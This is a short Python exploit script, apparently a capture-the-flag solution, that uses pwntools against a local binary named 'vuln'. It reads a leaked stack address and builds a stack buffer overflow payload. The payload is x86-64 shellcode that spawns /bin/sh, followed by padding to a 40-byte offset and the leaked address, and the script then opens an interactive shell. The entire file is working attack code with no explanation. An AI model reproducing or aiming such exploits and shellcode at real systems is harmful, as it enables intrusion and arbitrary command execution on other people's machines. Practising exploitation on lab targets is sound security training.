from pwn import *

p = process("./vuln")

# Buffer is at 40

shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

addr = int(p.recvline().strip(), 16) # This line is recieving the address
log.info("Leak: "+hex(addr))
payload = shellcode + b"A"*(40 - len(shellcode)) + p64(addr)


pause()
p.sendline(payload)

p.interactive()
